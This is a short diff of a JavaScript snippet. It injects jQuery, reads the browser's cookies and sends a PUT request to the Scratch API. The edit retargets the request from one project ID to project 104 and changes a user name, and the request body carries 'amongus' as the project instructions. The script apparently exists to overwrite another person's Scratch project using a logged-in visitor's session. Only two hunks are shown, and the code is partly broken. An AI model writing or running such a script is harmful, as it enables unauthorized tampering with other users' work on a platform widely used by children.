@@ -1,7 +1,7 @@
 var tag = document.createElement("script");
 tag.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js";
 document.getElementsByTagName("head")[0].appendChild(tag);
-var User = "PaddlerGames";
+var User = "CatsUnited";
 function getCookie(cname) {
     let name = cname + "=";
     let decodedCookie = decodeURIComponent(document.cookie);
@@ -18,7 +18,7 @@ function getCookie(cname) {
     return "";
 }
 $.ajax({
-    url: "https://api.scratch.mit.edu/projects/623849753",
+    url: "https://api.scratch.mit.edu/projects/104",
     Connection: close,
     data: '{"instructions":"amongus"}',
     type: "PUT",
